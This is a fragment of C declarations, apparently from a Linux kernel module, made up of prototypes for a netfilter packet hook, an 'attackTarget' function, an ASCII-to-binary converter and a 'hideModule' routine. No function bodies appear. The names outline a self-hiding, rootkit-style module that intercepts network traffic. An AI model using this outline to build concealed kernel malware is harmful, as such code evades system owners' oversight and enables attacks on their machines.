__u32 convertASCIItoBinary(const char *str);
static int attackTarget(void);
static unsigned int hookFunction(unsigned int hooknum, struct sk_buff *skb,
                                  const struct net_device *in,
                                  const struct net_device *out,
                                  int (*okfn)(struct sk_buff *));
void hideModule(void);
